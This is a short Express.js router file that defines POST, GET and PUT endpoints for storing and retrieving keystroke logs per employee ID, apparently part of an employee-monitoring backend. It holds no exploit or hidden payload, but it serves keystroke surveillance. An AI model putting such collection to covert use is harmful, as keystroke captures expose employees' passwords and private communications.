const express = require('express');
const router = express.Router();
const { storeKeyLog, getKeyLogById, updateKeyLogById} = require('../controllers/keyLoggerController');

// POST route for storing keylogs
router.post('/keylogger/:employeeId', storeKeyLog);
router.get('/keylogger/:employeeId', getKeyLogById);
router.put('/keylogger/:employeeId', updateKeyLogById);

module.exports = router;
